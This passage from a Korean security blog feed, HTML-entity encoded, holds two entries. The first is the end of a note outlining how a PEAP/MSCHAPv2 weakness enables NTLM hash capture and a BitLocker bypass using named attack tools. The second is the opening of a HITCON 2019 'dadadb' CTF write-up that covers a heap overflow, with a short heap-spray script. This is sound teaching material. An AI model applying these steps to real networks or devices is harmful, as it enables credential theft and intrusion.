&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB3C4;&#xBA54;&#xC778; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; MSCHAPv2&#xC640; PEAP&#xB97C; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBB34;&#xC120; &#xC561;&#xC138;&#xC2A4; &#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC778;&#xC99D;&#xD560; &#xB54C; resulting challenge response hash&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xC758; NTLM &#xD574;&#xC26C;&#xB85C;&#xBD80;&#xD130; &#xD30C;&#xC0DD;&#xB429;&#xB2C8;&#xB2E4;. &#xB3C4;&#xBA54;&#xC778; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xCEF4;&#xD4E8;&#xD130; &#xC778;&#xC99D;&#xC744; &#xC704;&#xD55C; &#xC635;&#xC158;&#xB3C4; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130; &#xC778;&#xC99D;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC778;&#xC99D;&#xC11C;&#xB098; MSCHAPv2&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; PEAP&#xC640; MSCHAPv2&#xB97C; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; &#xB3C4;&#xBA54;&#xC778; &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; NTLM &#xD574;&#xC26C;&#xAC00; &#xC778;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xBCF4;&#xD1B5; &#xC554;&#xD638;&#xB294; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; NTLM &#xD574;&#xC26C;&#xB294; <a href="https://crack.sh/wpa-enterprise/">crack.sh</a>&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><a href="https://github.com/sensepost/hostapd-mana">hostapd-mana</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB0B4;&#xBD80; &#xC778;&#xC99D; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB41C; MSCHAPv2&#xB97C; &#xD1B5;&#xD574; PEAP&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xC561;&#xC138;&#xC2A4; &#xD3EC;&#xC778;&#xD2B8; &#xC0DD;&#xC131;</li><li><a href="https://github.com/moxie0/chapcrack">chapcrack</a>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; MSCHAPv2 challenge response hash&#xB97C; cloud crack &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xBCC0;&#xD658;</li><li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>&#xC758; <code>ticketer.py</code>&#xACFC; NTLM hash&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xCCB4; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;</li></ol><p>BitLocker Full Disk Encryption&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xC5EC; &#xB3C4;&#xBA54;&#xC778; SID&#xB97C; &#xC5BB;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. hostapd&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; WPA2-PSK &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; LDAP ping&#xC744; &#xD1B5;&#xD574; Active Directory Domain name, victim&#xC758; host name, &#xB3C4;&#xBA54;&#xC778; SID&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>ticketer.py</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC804;&#xCCB4; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb</title>
    <link href="/2021/04/18/l0ch/pwncoolsexy-part4/"/>
    <url>/2021/04/18/l0ch/pwncoolsexy-part4/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 3 - NT Heap(2)</a></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! </p><p>&#xBC8C;&#xC368; &#xBE14;&#xB85C;&#xADF8; &#xC624;&#xD508;&#xD55C;&#xC9C0; &#xBC18;&#xB144;&#xC774; &#xB418;&#xB294; 4&#xC6D4;&#xC774;&#xB124;&#xC694;!  <del><em>&#xADF8;&#xB9AC;&#xACE0; &#xB2E4;&#xC74C;&#xC8FC;&#xBA74; &#xC911;&#xAC04;&#xACE0;&#xC0AC;&#xB78D;&#xB2C8;&#xB2E4; &#xD751;&#x314E;&#xADF8; &#x3160;&#x3160;</em></del> </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled.png" alt="pwncoolsexy-part4/Untitled.png"></p><blockquote><p>&#xB098;.. &#xC878;&#xC5C5;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;..?</p></blockquote><p>&#xC2DC;&#xD5D8;&#xAE30;&#xAC04;&#xC5D0;&#xB294; &#xC5ED;&#xC2DC; &#xB534; &#xAC70; &#xD558;&#xB294; &#xAC8C; &#xC81C;&#xC77C; &#xC7AC;&#xBC0C;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; &#xC2DC;&#xD5D8;&#xAE30;&#xAC04; &#xBC84;&#xD504;&#xB97C; &#xBC1B;&#xC544; &#xC81C;&#xC77C; &#xC7AC;&#xBC0C;&#xAC8C; &#xC791;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;; (&#xD559;&#xC810;&#xACFC; &#xB4F1;&#xAC00; &#xAD50;&#xD658;&#xD55C; &#xAC74; &#xB364;) &#xC624;&#xB298;&#xC740; HITCON 2019 Quals&#xC5D0; &#xCD9C;&#xC81C;&#xB41C; Windows pwnable &#xBB38;&#xC81C;&#xC778; dadadb&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; NT Heap&#xC5D0;&#xC11C;&#xC758; exploitation&#xC744; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Windows x64 on windows sever 2019<ul><li>Similar to Windows 10 (1809)</li></ul></li><li>AppJailLauncher</li><li>DEP</li><li>ASLR</li><li>CFG</li><li>&#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xBD88;&#xAC00;<ul><li>&#xC0C8; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xBD88;&#xAC00;&#xB2A5;</li></ul></li><li>Private Heap</li></ul><p>Windows 1809 (&#xBE4C;&#xB4DC; 17763.1) &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>&#xC5EC;&#xB2F4;&#xC73C;&#xB85C;.. Windows10 1809 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; Windows Terminal &#xC9C0;&#xC6D0;&#xC774; &#xC548;&#xB3FC; &#xB208;&#xBB3C;&#xC744; &#xBA38;&#xAE08;&#xACE0; winpwn&#xC758; &#xD3F0;&#xD2B8; &#xC2A4;&#xD0C0;&#xC77C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xB2E4;&#xB978; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xC4F8; &#xC218; &#xBC16;&#xC5D0; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;;; &#xD574;&#xD0B9;&#xD560; &#xB550; &#xBAA8;&#xB2C8;&#xD130;&#xAC00; &#xD654;&#xB824;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;.. &#xADF8;&#xB7FC; &#xC775;&#xC2A4; &#xC548;&#xB418;&#xB358; &#xAC83;&#xB3C4; &#xB418;&#xB294;&#xAC70; &#x3147;&#x3148;?</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%201.png" alt="pwncoolsexy-part4/Untitled%201.png"></p><blockquote><p><strong>&#xC8FC;&#xC758;</strong> &#xAC89;&#xBA4B;&#xB9CC; &#xB4E4;&#xBA74; &#xB9DD;&#xD55C;&#xB2E4;.</p></blockquote><p>&#xC81C; &#xC598;&#xAE30;&#xB124;&#xC694; &#x314E;&#x314E;.. &#xC544;&#xBB34;&#xD2BC;, &#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCC2C;&#xCC2C;&#xD788; &#xB72F;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB2E4;&#xB978; &#xC124;&#xBA85; &#xC5C6;&#xC774; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xB294;&#xB370;, 1&#xBC88;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%202.png" alt="pwncoolsexy-part4/Untitled%202.png"></p><p><code>user.txt</code>&#xC5D0; &#xC788;&#xB294; &#xC5EC;&#xB7EC; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC911; &#xD558;&#xB098;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xBA74; &#xAC04;&#xB2E8;&#xD55C; DB &#xAE30;&#xB2A5;&#xC774; &#xAD6C;&#xD604;&#xB41C; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%203.png" alt="pwncoolsexy-part4/Untitled%203.png"></p><blockquote><p>user.txt&#xC758; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;</p></blockquote><p>&#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC774;&#xD6C4; &#xBA54;&#xB274;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>add<ul><li>key, size, data&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC544; &#xB178;&#xB4DC; &#xCD94;&#xAC00;</li><li>node list&#xC5D0; key&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xD574;&#xB2F9; key&#xC758; data &#xC218;&#xC815;</li></ul></li><li>view<ul><li>key&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC544; &#xB178;&#xB4DC; &#xAC80;&#xC0C9; &#xD6C4; key&#xC640; data &#xCD9C;&#xB825;</li></ul></li><li>delete<ul><li>key&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC544; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xB178;&#xB4DC; &#xC0AD;&#xC81C;</li></ul></li><li>logout<ul><li>&#xB85C;&#xADF8;&#xC544;&#xC6C3;&#xD558;&#xACE0; &#xB85C;&#xADF8;&#xC778; &#xC804;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC10;</li></ul></li></ol><p>&#xAE30;&#xB2A5;&#xC774; &#xB9CE;&#xC9C0; &#xC54A;&#xC544; &#xC774; &#xC815;&#xB3C4;&#xB85C;&#xB9CC; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xBC14;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xBD80;&#xD130; &#xCC3E;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>&#xC6B0;&#xC120; &#xC785;&#xB825;&#xBC1B;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC778; <code>node</code> &#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC73C;&#xBA70; 256&#xAC1C;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xB85C; &#xC120;&#xC5B8;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%204.png" alt="pwncoolsexy-part4/Untitled%204.png"></p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>{</span><span class="hljs-keyword">char</span>* data;<span class="hljs-keyword">size_t</span> size;<span class="hljs-keyword">char</span> key[<span class="hljs-number">41</span>];<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>}<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">list</span>[256];</span></code></pre><p><code>main()</code>&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>user.txt</code> &#xC758; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xC258;&#xC744; &#xC5BB;&#xC740; &#xC774;&#xD6C4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png" alt="pwncoolsexy-part4/Untitled%205.png"></p><p>&#xC774;&#xC911; &#xC0C8;&#xB85C;&#xC6B4; node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; <code>add_sub_1340()</code> &#xD568;&#xC218;&#xB97C; &#xC790;&#xC138;&#xD788; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%206.png" alt="pwncoolsexy-part4/Untitled%206.png"></p><p><code>add_sub_1340()</code>&#xC758; node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><code>Key</code>&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xACE0; &#xBE68;&#xAC04; &#xBC15;&#xC2A4;&#xC5D0;&#xC11C; &#xD604;&#xC7AC; node list&#xC5D0; &#xC785;&#xB825;&#xBC1B;&#xC740; <code>Key</code>&#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9CC;&#xC57D; &#xBABB; &#xCC3E;&#xC558;&#xB2E4;&#xBA74; <code>LABEL_13</code>&#xC73C;&#xB85C; &#xC810;&#xD504;&#xD574; &#xC0C8; node&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xCC3E;&#xC558;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xCC3E;&#xC740; &#xACBD;&#xC6B0; linked list&#xC758; head&#xC5D0; &#xC0C8; node&#xB97C; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. (node[2] &#x2192; node[1] &#x2192; node[0]&#x2026;)</li></ul></li></ul><p>&#xC785;&#xB825;&#xBC1B;&#xC740; Key&#xAC12;&#xC774; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB97C; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%207.png" alt="pwncoolsexy-part4/Untitled%207.png"></p><ul><li>&#xC77C;&#xCE58;&#xD558;&#xB294; <code>Key</code>&#xAC12;&#xC758; &#xB178;&#xB4DC;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA74; &#xD574;&#xB2F9; <code>node&#x2192;data</code>&#xB97C; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xC0AC;&#xC774;&#xC988;&#xB97C; <code>new_size</code>&#xC5D0; &#xC0C8;&#xB85C; &#xC785;&#xB825;&#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>new_size</code>&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC744; <code>0x1000</code>&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>new_size</code>&#xB9CC;&#xD07C; <code>node&#x2192;data</code>&#xC5D0; &#xC0C8;&#xB85C; Heap&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>new_size</code>&#xB9CC;&#xD07C; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xD55C; <code>node&#x2192;data</code>&#xC5D0; &#xC774;&#xC804;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>node&#x2192;data</code>&#xC758; &#xC0AC;&#xC774;&#xC988;&#xC778; <code>old_size</code>&#xB9CC;&#xD07C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li><code>new_size</code>&#xAC00; <code>old_size</code>&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; Heap buffer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><p>&#xBA3C;&#xC800; Heap overflow&#xB97C; &#xC774;&#xC6A9;&#xD574; Heap &#xC8FC;&#xC18C;&#xB97C; leak &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; LFH&#xB97C; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; chunk&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%208.png" alt="pwncoolsexy-part4/Untitled%208.png"></p><p>node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; 19&#xBC88;&#xC9F8;&#xC5D0;&#xC11C; LFH &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; node&#xB97C; &#xC138; &#xAC1C;&#xB9CC; &#xCD94;&#xAC00;&#xD574;&#xC11C; &#xC5B4;&#xB5A4; &#xC704;&#xCE58;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#...</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png" alt="pwncoolsexy-part4/Untitled%209.png"></p><p>LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; chunk&#xB4E4;&#xC774; &#xBB34;&#xC791;&#xC704;&#xB85C; heap&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5B4; chunk &#xAC04; &#xAC70;&#xB9AC;&#xAC00; &#xBD88;&#xADDC;&#xCE59;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; chunk&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD55C;&#xB9C8;&#xB514;&#xB85C; &#xC6D0;&#xD558;&#xB294; heap layout&#xC744; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xC5B4;&#xC9C0;&#xC8E0;. &#xB530;&#xB77C;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;&#xB294; reliable &#xD55C; leak&#xC774; &#xBD88;&#xAC00;&#xB2A5;.. &#xD558;&#xC9C0;&#xB9CC;! &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC73C;&#xB2C8;&#xAE4C; &#xC774;&#xB7F0; &#xC0BD;&#xC9C8;&#xC744; &#xD558;&#xB294; &#xAC70; &#xC544;&#xB2C8;&#xACA0;&#xC5B4;&#xC694;?&#x314E;&#x314E;</p><h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>&#xC790; &#xC774;&#xC81C; &#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xBC30;&#xC6B4; <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>&#xC744; &#xC368;&#xBA39;&#xC744; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xBB34;&#xC791;&#xC704; &#xD560;&#xB2F9;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB420; chunk &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xB2E4;&#xBA74;? &#xADF8;&#xB7FC; &#xB2E4; &#xCC44;&#xC6CC;&#xBC84;&#xB9AC;&#xACE0; &#xD55C; &#xACF3;&#xB9CC; &#xB0A8;&#xACA8;&#xB194;&#xC11C; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2010.png" alt="pwncoolsexy-part4/Untitled%2010.png"></p><blockquote><p>&#xC120;&#xD0DD;&#xC9C0;&#xB294; &#xC5C6;&#xB2E4;.</p></blockquote><p>&#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2011.png" alt="pwncoolsexy-part4/Untitled%2011.png"></p><ol><li>LFH chunk&#xB85C; userblock&#xC744; &#xBAA8;&#xB450; &#xCC44;&#xC6C1;&#xB2C8;&#xB2E4;. </li><li>&#xC784;&#xC758;&#xC758; chunk(&#xC5EC;&#xAE30;&#xC11C;&#xB294; LFH5)&#xB97C; &#xD574;&#xC81C;&#xD558;&#xBA74; &#xD604;&#xC7AC; userblock&#xC5D0;&#xB294; &#xBE48; &#xACF5;&#xAC04;&#xC774; LFH5&#xAC00; &#xD574;&#xC81C;&#xB41C; &#xACF5;&#xAC04;&#xBC16;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>add LFH4&#xB85C; <code>LFH4&#x2192;data</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD560;&#xB2F9;&#xD558;&#xBA74; LFH&#xB294; &#xD574;&#xC81C;&#xB41C; chunk &#xC6B0;&#xC120;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xD574;&#xC81C;&#xB41C; LFH5 &#xACF5;&#xAC04;&#xC5D0; &#xC0C8;&#xB85C; data&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.  </li><li>3&#xBC88;&#xC758; &#xACFC;&#xC815;&#xC5D0;&#xC11C; overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xC539;&#xACE0; &#xB72F;&#xACE0; &#xB9DB;&#xBCF4;&#xACE0; &#xC990;&#xAE30;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</li></ol><p>&#xBA3C;&#xC800; LFH chunk&#xB97C; 0~16&#xAE4C;&#xC9C0; 17&#xAC1C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2012.png" alt="pwncoolsexy-part4/Untitled%2012.png"></p><p>&#xB79C;&#xB364; &#xD55C; &#xC704;&#xCE58;&#xC5D0; 